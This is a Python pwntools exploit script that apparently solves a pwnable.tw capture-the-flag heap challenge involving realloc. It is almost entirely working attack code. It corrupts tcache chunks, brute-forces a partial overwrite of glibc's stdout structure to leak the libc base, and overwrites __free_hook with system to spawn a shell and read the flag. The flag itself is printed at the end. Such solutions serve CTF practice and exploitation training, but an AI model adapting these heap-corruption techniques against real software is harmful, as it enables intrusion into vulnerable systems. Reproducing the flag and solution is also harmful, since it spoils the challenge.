#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

# context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(" ")

filename = "./pwn"
# p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass

def alloc(idx, size, data=b"aaa"):
	ru(b"Your choice:")
	sl(b"1")
	ru(b"Index:")
	sl(str(idx).encode())
	ru(b"Size:")
	sl(str(size).encode())
	ru(b"Data:")
	sn(data)
def realloc(idx, size, data=None):
	ru(b"Your choice:")
	sl(b"2")
	ru(b"Index:")
	sl(str(idx).encode())
	ru(b"Size:")
	sl(str(size).encode())
	if size:
		ru(b"Data:")
		sn(data)
def free(idx):
	ru(b"Your choice:")
	sl(b"3")
	ru(b"Index:")
	sl(str(idx).encode())


# target_addr = 0xdeadbeef
# data = p64(0xcafedead)
# alloc(0, 0x20, b"aaa")
# realloc(0, 0)
# realloc(0, 0x20, p64(target_addr))
# alloc(1, 0x20, b"aaa")
# realloc(0, 0x30, data)
# free(0)
# realloc(1, 0x30, b"a"*0x20)
# free(1)


while 1:
	p = remote("chall.pwnable.tw",10310)
	# p = process(filename)
	try:
		alloc(0,0x38)
		alloc(1,0x38)
		free(1)
		realloc(0,0)

		# lg("p.pid")
		test_bit = bytes([9 * 0x10])
		realloc(0,0x38, b'\x10' + test_bit)

		# debugPID()
		alloc(1, 0x38)
		realloc(1, 0x18, b"a")
		free(1)

		# debugPID()
		alloc(1, 0x38, b'\x00'*0x1d + b'\xff'*0x1)
		realloc(1, 0x58, b'\x00')


		realloc(0, 0x18, b"\x00"*0x18)
		free(0)

		test_bit = 0xb
		realloc(1,0x78, b'\x00'*0x60 + p16((test_bit << 0xc) + (l.symbols['_IO_2_1_stdout_'] & 0xfff)))

		payload = p64(0xfbad1887)
		payload+= p64(0)*3
		alloc(0, 0x58, payload)

		debugPID()
		rn(0x58)
		libc_base = uu64(rn(6)) - 0x1e6560
		lg("libc_base")

		realloc(1, 0x78, b'\x00'*0x60 + p64(libc_base + l.symbols['__free_hook']-8))
		free(1)
		alloc(1,0x58,b'/bin/sh\x00' + p64(l.symbols['system'] + libc_base))
		free(1)



		# debugPID()
		sl(b"cat /home/re-alloc*/flag")
		irt()

	except Exception as e:
		p.close()

# FLAG{r3alloc_the_heap_r3alloc_the_file_Str34m_r3alloc_my_lif3}